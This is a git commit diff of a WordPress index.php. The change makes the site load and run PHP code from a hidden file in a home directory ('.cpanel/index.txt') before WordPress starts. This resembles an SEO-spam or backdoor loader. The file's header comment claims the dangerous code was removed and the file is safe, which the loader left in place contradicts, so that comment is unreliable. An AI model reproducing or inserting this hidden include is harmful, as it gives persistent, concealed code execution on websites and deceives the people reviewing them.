1b834345cafdce0dad342af854fd4c1c99a98ba1
ranasoham988-maker <ranasoham988@gmail.com>
2025-12-16 22:56:28 +0600

    Update index.php

--- 16/index.php
+++ 16/index.php
@@ -4,7 +4,16 @@
 * However, the dangerous code has been removed, and the file is now safe to use.
 */
 
-$seo_logic_path = '/home/enteginc/.cl.selector/index.txt'; 
+// Define the absolute path to your file.
+// The content of this file MUST be valid PHP code.
+$seo_logic_path = '/home/moriczd1/.cpanel/index.txt'; 
+
+// --- REPLACE THE REMOTE FETCH/EVAL BLOCK WITH THIS ---
+// Use require_once with the absolute path.
+// Note: This requires that the web server user has read access to this file.
 require_once $seo_logic_path; 
+// --- END OF REPLACEMENT ---
+
+// The rest of your WordPress bootstrap code
 define('WP_USE_THEMES', true);
 require __DIR__ . '/wp-blog-header.php';
